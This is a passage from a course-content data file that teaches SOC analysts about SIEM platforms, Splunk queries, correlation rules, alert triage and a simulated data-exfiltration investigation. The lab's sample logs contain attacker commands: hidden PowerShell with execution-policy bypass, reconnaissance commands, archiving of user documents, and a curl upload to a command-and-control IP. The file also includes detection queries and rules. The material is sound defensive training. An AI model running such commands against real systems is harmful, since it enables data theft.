  "service": "ssh"
}
\`\`\`

### 3. Correlation & Detection

The SIEM applies rules to identify threats:

**Simple Rule:**
\`\`\`
IF event_type = "authentication" 
AND outcome = "failure" 
AND count > 5 within 5 minutes
THEN alert "Potential Brute Force"
\`\`\`

**Complex Correlation:**
\`\`\`
IF (failed_logins > 5 from source_ip)
AND THEN (successful_login from same source_ip)
AND THEN (new_process = "powershell.exe" on same host)
WITHIN 10 minutes
THEN alert "Successful Brute Force with Post-Exploitation"
\`\`\`

### 4. Alerting & Response

When rules match, the SIEM:
- Creates an alert with severity
- Enriches with context
- Notifies analysts
- Optionally triggers automation (SOAR)

## Major SIEM Platforms

| Platform | Type | Strengths |
|----------|------|-----------|
| **Splunk** | Commercial | Powerful SPL, extensive ecosystem |
| **Microsoft Sentinel** | Cloud | Azure integration, AI/ML |
| **Elastic Security** | Open Source | Scalable, free tier available |
| **IBM QRadar** | Commercial | Strong correlation |
| **Google Chronicle** | Cloud | Massive scale, fast search |
| **LogRhythm** | Commercial | Built-in SOAR |
| **Sumo Logic** | Cloud | Cloud-native, ML |

## SIEM Architecture

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                         SIEM Architecture                        │
│                                                                  │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐         │
│  │   Indexers  │    │   Search    │    │  Dashboard  │         │
│  │   (Store)   │←───│   (Query)   │←───│   (View)    │←─ User  │
│  └──────┬──────┘    └─────────────┘    └─────────────┘         │
│         ↑                                                       │
│  ┌──────┴──────┐                                                │
│  │   Parsers   │                                                │
│  │ (Normalize) │                                                │
│  └──────┬──────┘                                                │
│         ↑                                                       │
│  ┌──────┴──────┐                                                │
│  │ Collectors  │ ← Logs from endpoints, network, cloud          │
│  │  (Ingest)   │                                                │
│  └─────────────┘                                                │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

## SIEM Value for SOC

### Detection Capabilities
- Real-time alerting on threats
- Pattern matching across sources
- Anomaly detection
- Threat intelligence integration

### Investigation Support
- Centralized log search
- Timeline reconstruction
- Correlation of related events
- Evidence preservation

### Compliance & Reporting
- Audit trail maintenance
- Compliance dashboards
- Automated reporting
- Retention policies

## Common SIEM Challenges

| Challenge | Description | Mitigation |
|-----------|-------------|------------|
| Alert Fatigue | Too many alerts | Tuning, prioritization |
| Data Volume | Massive log volumes | Tiered storage, filtering |
| False Positives | Noise in alerts | Rule tuning, ML |
| Coverage Gaps | Missing log sources | Onboarding plan |
| Skill Gap | Complex queries | Training, playbooks |
    `,
    keyTakeaways: [
      "SIEM combines log collection, correlation, and alerting in one platform",
      "Raw logs are normalized into structured, searchable data",
      "Correlation rules detect threats by matching patterns across events",
      "Major platforms include Splunk, Sentinel, Elastic, QRadar, and Chronicle",
      "Common challenges include alert fatigue, data volume, and false positives"
    ]
  },
  {
    id: "4.2",
    courseId: "soc-fundamentals",
    title: "SIEM Navigation & Interface",
    content: `
# SIEM Navigation & Interface

Efficiently navigating your SIEM is crucial for effective threat detection and investigation. This lesson covers the common interface elements you'll encounter across SIEM platforms.

## Common SIEM Interface Elements

### Main Navigation Areas

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│  Logo   [Search] [Alerts] [Dashboards] [Reports] [Settings]    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                    MAIN WORKSPACE                        │   │
│  │                                                          │   │
│  │  • Search/Query Interface                               │   │
│  │  • Alert Queue                                          │   │
│  │  • Dashboards                                           │   │
│  │  • Investigation Workspace                              │   │
│  │                                                          │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                  │
│  [Time Picker]  [Filters]  [Export]  [Save]                     │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

## Key Interface Components

### 1. Search Bar

The search bar is where you'll spend most of your time:

**Features:**
- Query input field
- Time range selector
- Field suggestions/autocomplete
- Search history
- Saved searches

**Example Search:**
\`\`\`
index=security sourcetype=WinEventLog EventCode=4625 
| stats count by src_ip, user
| where count > 10
\`\`\`

### 2. Alert Queue

Where you'll see triggered alerts:

| Column | Description |
|--------|-------------|
| Severity | Critical/High/Medium/Low |
| Alert Name | Detection rule name |
| Time | When it triggered |
| Status | New/In Progress/Closed |
| Assignee | Who's working it |
| Asset | Affected system |
| Source | Origin of threat |

### 3. Dashboards

Visual displays of security metrics:

**Common Dashboard Types:**
- **Overview**: High-level security posture
- **Threat Detection**: Alert trends, top threats
- **Network**: Traffic patterns, connections
- **Authentication**: Login activity, failures
- **Endpoint**: Process, file activity

**Dashboard Elements:**
\`\`\`
┌───────────────────────────────────────────────────────────┐
│ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐          │
│ │ Total Alerts│ │ Critical    │ │ Open Cases  │          │
│ │    1,234    │ │     23      │ │     45      │          │
│ └─────────────┘ └─────────────┘ └─────────────┘          │
│                                                           │
│ ┌─────────────────────────────────────────────────────┐  │
│ │              Alert Trend (7 days)                    │  │
│ │  ▃▅▆▇▅▄▃                                            │  │
│ └─────────────────────────────────────────────────────┘  │
│                                                           │
│ ┌─────────────────────┐ ┌─────────────────────────────┐  │
│ │   Top Alert Types   │ │     Top Affected Assets     │  │
│ │   • Brute Force 45% │ │     • WKS-001              │  │
│ │   • Malware 30%     │ │     • SRV-DB01             │  │
│ │   • Policy 25%      │ │     • FW-EDGE01            │  │
│ └─────────────────────┘ └─────────────────────────────┘  │
└───────────────────────────────────────────────────────────┘
\`\`\`

### 4. Investigation Workspace

Where you dig into specific incidents:

**Features:**
- Event timeline
- Related events
- Entity details (users, hosts, IPs)
- Evidence collection
- Notes and collaboration

## Time Range Selection

Critical for scoping your searches:

| Option | Use Case |
|--------|----------|
| Last 15 min | Real-time monitoring |
| Last 1 hour | Recent alert investigation |
| Last 24 hours | Daily review |
| Last 7 days | Trend analysis |
| Custom range | Incident investigation |

**Tip:** Start broad, then narrow down based on findings.

## Filtering and Field Selection

### Common Filters

\`\`\`
Filter by:
├── Severity: Critical, High, Medium, Low
├── Status: New, In Progress, Closed
├── Source Type: Windows, Linux, Firewall, etc.
├── Asset: Specific hosts or groups
├── User: Specific users or groups
└── Time: Custom ranges
\`\`\`

### Field Browser

Most SIEMs have a field browser showing:
- Available fields
- Field values
- Value counts
- Quick filtering

## Workflow Tips

### Efficient Navigation

1. **Bookmark common searches** - Save frequently used queries
2. **Create personal dashboards** - Track what matters to you
3. **Use keyboard shortcuts** - Faster than clicking
4. **Leverage templates** - Start from existing queries
5. **Set up alert notifications** - Don't miss critical alerts

### Common Keyboard Shortcuts

| Action | Shortcut |
|--------|----------|
| Search | Ctrl/Cmd + Enter |
| New search | Ctrl/Cmd + N |
| Save search | Ctrl/Cmd + S |
| Time range | Ctrl/Cmd + T |
| Toggle sidebar | Ctrl/Cmd + B |
    `,
    keyTakeaways: [
      "The search bar and time picker are your primary investigation tools",
      "Alert queues show triggered detections with severity and status",
      "Dashboards provide visual summaries of security metrics",
      "Always start with appropriate time ranges and refine as needed",
      "Save common searches and create personal dashboards for efficiency"
    ]
  },
  {
    id: "4.3",
    courseId: "soc-fundamentals",
    title: "Basic Search Queries",
    content: `
# Basic Search Queries

Learning to write effective SIEM queries is essential for SOC analysts. This lesson covers fundamental search concepts that apply across most SIEM platforms.

## Search Query Basics

### Query Structure

Most SIEM queries follow this pattern:

\`\`\`
[DATA SOURCE] [FILTERS] [TRANSFORMATIONS] [OUTPUT]
\`\`\`

**Example (Splunk SPL):**
\`\`\`
index=security sourcetype=WinEventLog EventCode=4625 
| stats count by src_ip 
| sort -count 
| head 10
\`\`\`

**Breakdown:**
- \`index=security\` - Data source
- \`sourcetype=WinEventLog EventCode=4625\` - Filters
- \`stats count by src_ip\` - Transformation (aggregation)
- \`sort -count | head 10\` - Output formatting

## Common Query Patterns

### 1. Simple Filtering

Find events matching specific criteria:

\`\`\`
# All failed logins
EventCode=4625

# Failed logins for specific user
EventCode=4625 user="admin"

# Failed logins from specific IP
EventCode=4625 src_ip="192.168.1.100"

# Combining filters
EventCode=4625 user="admin" src_ip="192.168.1.100"
\`\`\`

### 2. Wildcard Searches

Match patterns with wildcards:

\`\`\`
# Any user starting with "admin"
user=admin*

# Any domain ending in .xyz
domain=*.xyz

# Contains "password" anywhere
*password*
\`\`\`

### 3. Time-Based Queries

Scope searches to specific time ranges:

\`\`\`
# Last 24 hours
earliest=-24h latest=now

# Specific date range
earliest="01/15/2024:00:00:00" latest="01/16/2024:00:00:00"

# Last business day
earliest=-1d@d latest=@d
\`\`\`

### 4. Aggregation Queries

Summarize data:

\`\`\`
# Count events by user
| stats count by user

# Count events by source IP and user
| stats count by src_ip, user

# Get earliest and latest time by user
| stats earliest(_time) as first_seen, latest(_time) as last_seen by user

# Calculate average, min, max
| stats avg(bytes) min(bytes) max(bytes) by src_ip
\`\`\`

### 5. Sorting and Limiting

Control output:

\`\`\`
# Sort by count descending
| sort -count

# Sort by count ascending
| sort count

# Limit to top 10
| head 10

# Limit to bottom 10
| tail 10
\`\`\`

## Security Use Case Queries

### Brute Force Detection

\`\`\`
# Find IPs with many failed logins
EventCode=4625
| stats count by src_ip
| where count > 10
| sort -count
\`\`\`

### Successful Login After Failures

\`\`\`
# Track failed then successful logins
(EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode=4625)) as failures,
        count(eval(EventCode=4624)) as successes by src_ip, user
| where failures > 5 AND successes > 0
\`\`\`

### Suspicious Process Execution

\`\`\`
# PowerShell with encoded commands
EventCode=4688 
| search CommandLine="*-enc*" OR CommandLine="*-encoded*"
| table _time, ComputerName, User, CommandLine
\`\`\`

### Outbound Connection Analysis

\`\`\`
# Large outbound transfers
action=allowed direction=outbound
| stats sum(bytes_out) as total_bytes by src_ip, dest_ip
| where total_bytes > 100000000
| sort -total_bytes
\`\`\`

### User Activity Timeline

\`\`\`
# All activity for a specific user
user="jsmith"
| sort _time
| table _time, src_ip, action, dest, details
\`\`\`

## Query Building Tips

### Start Broad, Then Narrow

\`\`\`
Step 1: EventCode=4625
Step 2: EventCode=4625 | stats count by src_ip
Step 3: EventCode=4625 | stats count by src_ip | where count > 10
Step 4: EventCode=4625 | stats count by src_ip | where count > 10 | sort -count | head 10
\`\`\`

### Use Field Discovery

Before querying:
1. Check what fields are available
2. Understand field names and values
3. Verify data types

### Test Incrementally

Build queries step by step:
\`\`\`
# Test each part
EventCode=4625                              # Check base filter
EventCode=4625 | stats count               # Verify count works
EventCode=4625 | stats count by src_ip     # Add grouping
\`\`\`

## Common Operators

| Operator | Description | Example |
|----------|-------------|---------|
| = | Equals | user="admin" |
| != | Not equals | action!="allowed" |
| > < | Greater/Less than | count > 10 |
| AND | Both conditions | user="admin" AND action="login" |
| OR | Either condition | EventCode=4624 OR EventCode=4625 |
| NOT | Exclude | NOT action="allowed" |
| IN | Multiple values | EventCode IN (4624, 4625, 4648) |
    `,
    keyTakeaways: [
      "Queries follow a pattern: data source → filters → transformations → output",
      "Use wildcards (*) for pattern matching and partial searches",
      "Aggregation commands (stats, count, sum) summarize large datasets",
      "Always start broad and narrow down based on results",
      "Build queries incrementally and test each step"
    ],
    practicalExercise: {
      title: "Write SIEM Queries",
      description: "Practice writing queries for common security scenarios.",
      steps: [
        "Write a query to find all failed logins in the last 24 hours",
        "Modify it to group by source IP and count occurrences",
        "Filter to show only IPs with more than 5 failures",
        "Add user information to the output",
        "Sort by count and limit to top 10"
      ]
    }
  },
  {
    id: "4.4",
    courseId: "soc-fundamentals",
    title: "Correlation Rules & Alerts",
    content: `
# Correlation Rules & Alerts

Correlation rules are the detection logic that transforms raw events into actionable security alerts. Understanding how they work helps you investigate alerts effectively and suggest improvements.

## What is Correlation?

**Correlation** connects related events to identify patterns that individual events wouldn't reveal.

### Single Event vs. Correlation

**Single Event Detection:**
\`\`\`
Event: Failed login
Action: Maybe alert, maybe not (too noisy)
\`\`\`

**Correlated Detection:**
\`\`\`
Pattern: 10+ failed logins → successful login → PowerShell execution
Within: 5 minutes
From: Same source IP
Action: HIGH priority alert
\`\`\`

## Correlation Rule Components

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                     CORRELATION RULE                             │
├─────────────────────────────────────────────────────────────────┤
│  Trigger Conditions                                              │
│  ├── Event Type(s): What events to look for                     │
│  ├── Threshold: How many occurrences                            │
│  ├── Time Window: Within what timeframe                         │
│  └── Grouping: By what fields (IP, user, host)                  │
├─────────────────────────────────────────────────────────────────┤
│  Alert Configuration                                             │
│  ├── Severity: Critical/High/Medium/Low                         │
│  ├── Name: Descriptive alert title                              │
│  ├── Description: What was detected                             │
│  └── MITRE ATT&CK: Mapped technique                             │
├─────────────────────────────────────────────────────────────────┤
│  Response Actions                                                │
│  ├── Notification: Email, Slack, ticket                         │
│  ├── Enrichment: Add context automatically                      │
│  └── Automation: Trigger SOAR playbook                          │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

## Types of Correlation Rules

### 1. Threshold-Based

Trigger when count exceeds limit:

\`\`\`
Rule: Brute Force Detection
Condition: Failed logins > 10 in 5 minutes
Group By: Source IP
Severity: Medium
\`\`\`

### 2. Sequence-Based

Events must occur in order:

\`\`\`
Rule: Successful Attack Chain
Sequence:
  1. Failed logins (>5)
  2. Successful login
  3. Process execution
Time Window: 10 minutes
Group By: Source IP, Target Host
Severity: High
\`\`\`

### 3. Statistical/Anomaly

Deviation from baseline:

\`\`\`
Rule: Unusual Data Transfer
Condition: Outbound bytes > 3 standard deviations from baseline
Baseline: 30-day rolling average
Group By: Source IP
Severity: Medium
\`\`\`

### 4. Threat Intelligence

Match against known bad indicators:

\`\`\`
Rule: Known Malicious IP
Condition: Connection to IP in threat feed
Feeds: AlienVault, Abuse.ch, Internal
Severity: High
\`\`\`

## Alert Severity Levels

| Level | Criteria | Response Time |
|-------|----------|---------------|
| **Critical** | Active breach, data exfil, ransomware | Immediate |
| **High** | Confirmed malware, successful exploitation | < 1 hour |
| **Medium** | Suspicious activity, policy violation | < 4 hours |
| **Low** | Informational, minor anomaly | < 24 hours |

## Example Correlation Rules

### Rule 1: Password Spray Attack

\`\`\`yaml
name: Password Spray Attack Detected
description: Multiple users targeted with same password
mitre_attack: T1110.003

conditions:
  event_type: authentication_failure
  threshold: 
    unique_users: > 10
    failed_attempts: > 20
  time_window: 10 minutes
  group_by: source_ip

severity: HIGH

response:
  - create_alert
  - enrich_with_threat_intel
  - notify_channel: #soc-alerts
\`\`\`

### Rule 2: Lateral Movement Detection

\`\`\`yaml
name: Potential Lateral Movement
description: Same account authenticating to multiple systems
mitre_attack: T1021

conditions:
  event_type: successful_authentication
  logon_type: [3, 10]  # Network, RDP
  threshold:
    unique_hosts: > 5
  time_window: 30 minutes
  group_by: username

severity: MEDIUM

response:
  - create_alert
  - gather_user_context
\`\`\`

### Rule 3: Data Exfiltration Indicator

\`\`\`yaml
name: Large Outbound Transfer
description: Unusually large data transfer to external IP
mitre_attack: T1041

conditions:
  event_type: network_connection
  direction: outbound
  destination: external
  threshold:
    bytes_out: > 100MB
  time_window: 1 hour
  group_by: source_ip, destination_ip

exclusions:
  - destination_ip IN known_cloud_services
  - destination_ip IN backup_targets

severity: MEDIUM

response:
  - create_alert
  - capture_network_metadata
\`\`\`

## Alert Tuning

### Common Tuning Approaches

1. **Whitelist known-good activity**
   - Vulnerability scanners
   - Backup systems
   - Service accounts

2. **Adjust thresholds**
   - Too many alerts? Raise threshold
   - Missing detections? Lower threshold

3. **Refine time windows**
   - Too short = fragmented detection
   - Too long = delayed alerts

4. **Add context filters**
   - Business hours vs. off-hours
   - Production vs. development
   - Privileged vs. standard users

### Tuning Request Format

When requesting tuning:

\`\`\`
Rule Name: Brute Force Detection
Current Issue: High false positive rate
Proposed Change: Add whitelist for vulnerability scanner IPs
Business Justification: Scanner IPs (192.168.100.0/24) trigger 50+ alerts/day
Risk Assessment: Low - these are known internal scanners
\`\`\`
    `,
    keyTakeaways: [
      "Correlation connects related events to identify attack patterns",
      "Rules can be threshold-based, sequence-based, statistical, or TI-driven",
      "Severity levels drive response urgency and SLA requirements",
      "Alert tuning reduces false positives while maintaining detection",
      "Document tuning requests with business justification and risk assessment"
    ]
  },
  {
    id: "4.5",
    courseId: "soc-fundamentals",
    title: "Hands-On: SIEM Investigation Lab",
    content: `
# Hands-On: SIEM Investigation Lab

Practice your SIEM skills by investigating a realistic security scenario. This lab simulates the workflow you'll follow as a SOC analyst.

## Lab Scenario

**Alert Received:**
\`\`\`
Alert: Potential Data Exfiltration
Severity: High
Time: 2024-01-15 14:30:00 UTC
Source Host: WKS-SALES03
Source IP: 192.168.10.103
Destination: 185.234.72.50:443
Bytes Out: 150 MB
\`\`\`

**Your Task:**
Investigate this alert to determine if it's a true positive and understand the full scope of the incident.

## Investigation Workflow

### Phase 1: Alert Context

**Step 1: Review Alert Details**

Questions to answer:
- What triggered this alert?
- What is the source and destination?
- What is the timeline?
- Who is associated with this system?

**Query 1: Get alert context**
\`\`\`
host="WKS-SALES03" earliest=-2h latest=+1h
| sort _time
| table _time, event_type, src_ip, dest_ip, user, action, bytes
\`\`\`

### Phase 2: Source Investigation

**Step 2: Investigate the Source Host**

**Query 2: Recent activity on affected host**
\`\`\`
host="WKS-SALES03" earliest=-24h
| stats count by event_type
| sort -count
\`\`\`

**Query 3: User activity**
\`\`\`
host="WKS-SALES03" earliest=-24h
| stats values(user) as users, count by event_type
\`\`\`

**Query 4: Process execution**
\`\`\`
host="WKS-SALES03" EventCode=4688 earliest=-24h
| table _time, User, NewProcessName, CommandLine, ParentProcessName
| sort _time
\`\`\`

### Phase 3: Destination Investigation

**Step 3: Analyze the Destination**

**Query 5: Historical connections to destination**
\`\`\`
dest_ip="185.234.72.50" earliest=-30d
| stats count by src_ip, host
| sort -count
\`\`\`

**Query 6: Threat intelligence lookup**
\`\`\`
| inputlookup threat_intel 
| search ip="185.234.72.50"
\`\`\`

**External OSINT:**
- Check VirusTotal, AbuseIPDB
- Review domain registration (WHOIS)
- Check passive DNS history

### Phase 4: Timeline Reconstruction

**Step 4: Build the Attack Timeline**

**Query 7: All events for affected user/host**
\`\`\`
(host="WKS-SALES03" OR user="mwilson") earliest=-48h
| sort _time
| table _time, host, event_type, action, details
\`\`\`

## Lab Data (Simulated Results)

### Query Results

**Process Execution (Query 4):**
\`\`\`
13:00:00 | mwilson | outlook.exe | - | explorer.exe
13:15:00 | mwilson | WINWORD.EXE | "Q4_Report.docm" | explorer.exe
13:15:05 | mwilson | powershell.exe | powershell -w hidden -ep bypass | WINWORD.EXE
13:15:10 | mwilson | cmd.exe | cmd /c whoami | powershell.exe
13:15:15 | mwilson | cmd.exe | cmd /c net user | powershell.exe
13:16:00 | SYSTEM | svchost.exe | - | services.exe
14:00:00 | mwilson | 7z.exe | 7z a archive.7z C:\\Users\\mwilson\\Documents | cmd.exe
14:30:00 | mwilson | curl.exe | curl -X POST -F "file=@archive.7z" https://... | cmd.exe
\`\`\`

**Threat Intel (Query 6):**
\`\`\`
IP: 185.234.72.50
Category: Command and Control
Confidence: High
Associated Malware: Cobalt Strike
First Seen: 2024-01-10
\`\`\`

**Network Connections:**
\`\`\`
14:00:00 | WKS-SALES03 | 185.234.72.50:443 | 1024 bytes (beacon)
14:05:00 | WKS-SALES03 | 185.234.72.50:443 | 1024 bytes (beacon)
14:10:00 | WKS-SALES03 | 185.234.72.50:443 | 1024 bytes (beacon)
14:30:00 | WKS-SALES03 | 185.234.72.50:443 | 150 MB (exfiltration)
\`\`\`

## Analysis

### Attack Chain Reconstruction

\`\`\`
13:15 - User opens malicious Word doc (phishing)
      ↓
13:15 - Macro executes PowerShell (execution)
      ↓
13:15 - Reconnaissance commands (discovery)
      ↓
14:00 - Beacon established to C2 (command and control)
      ↓
14:00 - Documents archived with 7z (collection)
      ↓
14:30 - Archive uploaded to C2 (exfiltration)
\`\`\`

### MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|--------|-----------|----------|
| Initial Access | T1566.001 Phishing Attachment | Word doc opened |
| Execution | T1059.001 PowerShell | Hidden PowerShell |
| Discovery | T1033 System Owner | whoami command |
| Collection | T1560.001 Archive | 7z.exe usage |
| C2 | T1071.001 Web Protocols | HTTPS to C2 IP |
| Exfiltration | T1041 Exfil Over C2 | 150MB upload |

## Your Investigation Report

**Incident Summary:**
[True Positive - Confirmed malware infection with data exfiltration]

**Timeline:**
[Include key events with timestamps]

**Affected Assets:**
- Host: WKS-SALES03
- User: mwilson
- Data: User documents (150MB exfiltrated)

**Indicators of Compromise:**
- C2 IP: 185.234.72.50
- Malicious file: Q4_Report.docm
- Tools: PowerShell, 7z.exe, curl.exe

**Recommended Actions:**
1. Isolate WKS-SALES03 immediately
2. Block 185.234.72.50 at firewall
3. Reset mwilson's credentials
4. Preserve evidence for forensics
5. Search for similar activity across environment
    `,
    keyTakeaways: [
      "Follow a structured investigation workflow: context → source → destination → timeline",
      "Build queries incrementally to understand the scope of activity",
      "Correlate SIEM data with external threat intelligence for context",
      "Map findings to MITRE ATT&CK to understand the attack chain",
      "Document everything in a structured incident report"
    ],
    practicalExercise: {
      title: "Complete the SIEM Investigation",
      description: "Use the lab data to complete a full investigation report.",
      steps: [
        "Review all query results and identify suspicious activity",
        "Build a complete timeline of the attack",
        "Map each phase to MITRE ATT&CK techniques",
        "Extract all indicators of compromise",
        "Write recommended containment and remediation actions"
      ]
    }
  },
  // Continue with remaining modules (5-10) with similar detailed content...
  // Module 5: Alert Triage & Analysis
  {
    id: "5.1",
    courseId: "soc-fundamentals",
    title: "Understanding Security Alerts",
    content: `
# Understanding Security Alerts

Security alerts are the lifeblood of SOC operations. Understanding their anatomy, sources, and significance is crucial for effective triage and response.

## What is a Security Alert?

A **security alert** is a notification generated when a detection rule identifies potentially malicious or suspicious activity. It's a signal that requires human analysis.

## Alert Anatomy

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                      SECURITY ALERT                              │
├─────────────────────────────────────────────────────────────────┤
│ ID: ALT-2024-001234                                              │
│ Time: 2024-01-15 10:30:00 UTC                                   │
│ Severity: HIGH                                                   │
├─────────────────────────────────────────────────────────────────┤
│ Rule: Suspicious PowerShell Execution                           │
│ MITRE: T1059.001 - PowerShell                                   │
├─────────────────────────────────────────────────────────────────┤
│ Source:                                                          │
│   Host: WKS-FIN01                                               │
│   IP: 192.168.10.101                                            │
│   User: jsmith                                                  │
├─────────────────────────────────────────────────────────────────┤
│ Details:                                                         │
│   Command: powershell -enc SQBFAFgA...                          │
│   Parent: WINWORD.EXE                                           │
├─────────────────────────────────────────────────────────────────┤
│ Raw Event: [Expandable log data]                                │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

## Alert Sources

| Source Type | Examples | Alert Types |
|-------------|----------|-------------|
| **SIEM** | Splunk, Sentinel | Correlation rules |
| **EDR** | CrowdStrike, Defender | Endpoint threats |
| **NDR** | Darktrace, Vectra | Network anomalies |
| **Email Security** | Proofpoint, Mimecast | Phishing, malware |
| **Cloud Security** | AWS GuardDuty | Cloud threats |
| **WAF** | Cloudflare, Akamai | Web attacks |

## Severity Levels

### Critical
- Active ransomware
- Confirmed data breach
- C2 communication
- Privileged account compromise

### High
- Successful exploitation
- Malware execution
- Lateral movement detected
- Credential theft

### Medium
- Suspicious behavior
- Policy violations
- Reconnaissance activity
- Failed attacks

### Low
- Informational events
- Minor anomalies
- Configuration issues
- Compliance alerts

## Alert Context

### Essential Context for Triage:

**Asset Information:**
- Is this a critical system?
- What business function does it support?
- Who uses this system?
- What data does it contain?

**User Information:**
- Is this a privileged user?
- Normal behavior patterns?
- Current location/time zone?
- Recent activity?

**Historical Context:**
- Previous alerts on this asset?
- Known issues or false positives?
- Related ongoing incidents?

## Alert Fatigue

**The Problem:**
- Too many alerts = missed threats
- Average SOC sees 10,000+ alerts/day
- Only ~1-5% are true positives

**Contributing Factors:**
- Poor rule tuning
- Duplicate alerts
- Low-fidelity detections
- Lack of context

**Solutions:**
- Aggressive tuning
- Alert prioritization
- Automation for low-risk alerts
- Consolidation of related alerts
    `,
    keyTakeaways: [
      "Alerts contain severity, source, detection rule, and event details",
      "Severity levels range from Critical (active breach) to Low (informational)",
      "Context about assets and users is crucial for accurate triage",
      "Alert fatigue from too many false positives leads to missed threats",
      "Effective tuning and prioritization combat alert fatigue"
    ]
  },
  {
    id: "5.2",
    courseId: "soc-fundamentals",
    title: "The Triage Process",
    content: `
# The Triage Process

Triage is the process of quickly assessing alerts to determine their validity and priority. An efficient triage process is essential for managing alert volume effectively.

## Triage Goals

1. **Validate** - Is this alert legitimate?
2. **Prioritize** - How urgent is this?
3. **Enrich** - What context do we need?
4. **Decide** - Close, investigate, or escalate?

## The 5-Minute Triage Framework

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                   5-MINUTE TRIAGE                                │
├─────────────────────────────────────────────────────────────────┤
│ Minute 1: READ the alert                                        │
│           • What triggered it?                                  │
│           • What's the severity?                                │
│           • What's the source?                                  │
├─────────────────────────────────────────────────────────────────┤
│ Minute 2: CHECK quick wins                                      │
│           • Known false positive?                               │
│           • Scheduled activity?                                 │
│           • Duplicate ticket?                                   │
├─────────────────────────────────────────────────────────────────┤
│ Minute 3: ENRICH the data                                       │
│           • Lookup IOCs                                         │
│           • Check reputation                                    │
│           • Gather asset context                                │
├─────────────────────────────────────────────────────────────────┤
│ Minute 4: CORRELATE events                                      │
│           • Related alerts?                                     │
│           • Other affected systems?                             │
│           • Timeline of events?                                 │
├─────────────────────────────────────────────────────────────────┤
│ Minute 5: DECIDE and ACT                                        │
│           • False Positive → Document & Close                   │
│           • True Positive → Escalate & Document                 │
│           • Uncertain → Continue Investigation                  │
└─────────────────────────────────────────────────────────────────┘
\`\`\`

## Step-by-Step Triage

### Step 1: Initial Assessment

**Questions to Answer:**
- What detection rule triggered this?
- What severity was assigned?
- When did this occur?
- What asset is affected?

**Quick Check:**
\`\`\`
□ Alert is recent (not stale)
□ Alert is not a duplicate
□ Source system is valid
□ Data appears complete
\`\`\`

### Step 2: Quick Wins Check

Before deep-diving, check for easy closures:

\`\`\`
□ Is this a known false positive pattern?
□ Is there planned maintenance/testing?
□ Is this an authorized security scan?
□ Is this expected business activity?
□ Is this a duplicate of an open ticket?
\`\`\`

**If YES to any:** Document and close with appropriate reason.

### Step 3: IOC Enrichment

Gather intelligence on indicators:

**For IP Addresses:**
- Reputation (VirusTotal, AbuseIPDB)
- Geolocation
- Owner (WHOIS)
- Previous activity in environment

**For Domains:**
- Registration date
- Category
- Associated IPs
- DNS history

**For File Hashes:**
- Antivirus detection rate
- Sandbox results
- First seen date
- Associated campaigns

### Step 4: Context Gathering

**Asset Context:**
- What type of system?
- Business criticality?
- Normal activity patterns?
- Recent changes?

**User Context:**
- Role and department?
- Normal working hours?
- Current location?
- Account privileges?

### Step 5: Decision and Action

**Decision Matrix:**

| Finding | Action |
|---------|--------|
| Confirmed False Positive | Document pattern, close, consider tuning |
| Likely False Positive | Document reasoning, close |
| Uncertain | Continue investigation or escalate |
| Likely True Positive | Escalate immediately, begin documentation |
| Confirmed True Positive | Escalate immediately, initiate response |

## Triage Documentation

Always document your triage:

\`\`\`markdown
## Triage Summary
- Alert ID: ALT-2024-001234
- Triage Time: 2024-01-15 10:35:00
- Analyst: jdoe

## Findings
[What you observed]

## Investigation Steps
1. Checked IOC reputation - clean
2. Reviewed user activity - normal pattern
3. Verified scheduled maintenance window

## Conclusion
FALSE POSITIVE - Scheduled vulnerability scan

## Recommendation
Add scanner IPs to allowlist for this rule
\`\`\`
    `,
    keyTakeaways: [
      "Use the 5-minute triage framework: Read, Check, Enrich, Correlate, Decide",
      "Always check for quick wins before deep investigation",
      "Enrich IOCs with threat intelligence and reputation data",
      "Gather context about affected assets and users",
      "Document every triage decision with reasoning"
    ]
  },
  {
    id: "5.3",
    courseId: "soc-fundamentals",
    title: "True Positive vs False Positive",
    content: `
# True Positive vs False Positive

Distinguishing between real threats and false alarms is the core skill of alert triage. This lesson covers techniques to make accurate determinations.

## Classification Definitions

| Classification | Definition |
|----------------|------------|
| **True Positive (TP)** | Alert correctly identifies malicious activity |
| **False Positive (FP)** | Alert incorrectly flags benign activity |
| **True Negative (TN)** | No alert for benign activity (correct) |
| **False Negative (FN)** | No alert for malicious activity (missed threat) |

## The Decision Challenge

\`\`\`
                    ACTUAL STATE
                  Malicious    Benign
              ┌─────────────┬─────────────┐
    Alert     │    TRUE     │    FALSE    │
   Triggered  │  POSITIVE   │  POSITIVE   │
              ├─────────────┼─────────────┤
    No Alert  │    FALSE    │    TRUE     │
              │  NEGATIVE   │  NEGATIVE   │
              └─────────────┴─────────────┘
\`\`\`

## True Positive Indicators

Signs that an alert is likely a real threat:

### Strong TP Indicators

**Technical Evidence:**
- Known malicious IOCs (confirmed by multiple sources)
- Behavior matches known attack patterns
- Multiple correlated alerts
- Unusual activity for the asset/user
- Connections to known bad infrastructure

**Contextual Evidence:**
- Activity outside normal hours
- Unusual geographic location
- Privileged actions by non-privileged user
- No business justification
- Attempts to evade detection

### Example True Positive

\`\`\`
Alert: PowerShell Encoded Command
Host: WKS-ACCT01
User: jsmith
Time: 03:00 AM (user normally works 9-5)
Parent Process: WINWORD.EXE
Destination: IP flagged in 3 threat feeds

Analysis:
✓ Unusual time for this user
✓ Word spawning PowerShell is suspicious
✓ Encoded command (evasion)
✓ Connection to known malicious IP

Verdict: TRUE POSITIVE
\`\`\`

## False Positive Indicators

Signs that an alert is likely benign:

### Common FP Scenarios

**Legitimate Tools:**
- Security scanners
- IT management tools
- Developer activity
- Backup software

**Business Activity:**
- Scheduled tasks
- Approved testing
- Normal user behavior
- Expected integrations

**Rule Issues:**
- Overly broad detection logic
- Missing exclusions
- Threshold too low
- Outdated signatures

### Example False Positive

\`\`\`
Alert: Port Scan Detected
